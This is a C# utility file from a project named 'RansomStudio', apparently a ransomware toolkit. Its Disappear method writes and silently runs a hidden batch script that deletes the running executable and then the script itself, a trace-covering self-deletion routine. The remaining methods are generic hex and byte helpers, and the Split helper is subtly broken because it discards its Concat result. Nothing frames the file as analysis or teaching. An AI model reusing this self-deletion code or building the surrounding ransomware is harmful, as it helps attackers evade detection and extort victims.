using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace RansomStudio
{
    class Utils
    {
        public static void Disappear()
        {
            string batchCommands = string.Empty;
            string exeFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
            batchCommands += "@ECHO OFF\n";
            batchCommands += "ping 127.0.0.1 > nul\n";
            batchCommands += "echo j | del /F ";
            batchCommands += exeFileName + "\n";
            batchCommands += "echo j | del tmp.bat";
            System.IO.File.WriteAllText("tmp.bat", batchCommands);
            Process process = new Process();
            process.StartInfo.FileName = "tmp.bat";
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
        }

        public static IEnumerable<string> Split(string str, int chunkSize)
        {
            IEnumerable<string> result = Enumerable.Range(0, str.Length / chunkSize)
                .Select(i => str.Substring(i * chunkSize, chunkSize)).ToList();
            if (str.Length % chunkSize != 0)
                result.Concat(new string[] { str.Substring(str.Length - str.Length % chunkSize) });
            return result;
        }

        public static byte[] HexToBytes(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                            .Where(x => x % 2 == 0)
                            .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                            .ToArray();
        }

        public static string BytesToHex(byte[] bytes)
        {
            return BitConverter.ToString(bytes)
                   .Replace("-", "")
                   .ToLower();
        }
        public static byte[] MergeByteArrays(byte[][] arrays)
        {
            byte[] rv = new byte[arrays.Sum(a => a.Length)];
            int offset = 0;
            foreach (var array in arrays)
            {
                System.Buffer.BlockCopy(array, 0, rv, offset, array.Length);
                offset += array.Length;
            }

            return rv;
        }
    }
}
